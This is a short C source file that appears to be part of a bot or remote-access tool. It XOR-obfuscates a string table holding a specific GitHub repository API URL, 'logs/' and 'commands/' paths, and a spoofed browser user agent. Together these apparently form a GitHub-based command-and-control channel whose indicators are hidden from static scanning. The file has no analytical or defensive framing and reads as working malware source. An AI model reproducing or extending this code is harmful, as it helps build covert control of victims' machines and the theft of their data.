#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "table.h"

static char* table_storage[5];
static uint8_t xor_key = 0x5A;

static char* xor_str(const char* input) {
    size_t len = strlen(input);
    char* out = malloc(len + 1);
    for (size_t i = 0; i < len; i++)
        out[i] = input[i] ^ xor_key;
    out[len] = '\0';
    return out;
}

void table_init() {
    table_storage[TABLE_GITHUB_URL]  = xor_str("https://api.github.com/repos/ken3009le/ken3009le.github.io/contents/");
    table_storage[TABLE_LOG_PATH]    = xor_str("logs/");
    table_storage[TABLE_CMD_PATH]    = xor_str("commands/");
    table_storage[TABLE_USER_AGENT]  = xor_str("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
}

char* table_retrieve_val(int id) {
    if (id < 0 || id >= 5 || table_storage[id] == NULL) return NULL;
    char* decoded = xor_str(table_storage[id]); // Decrypt lại
    return decoded;
}
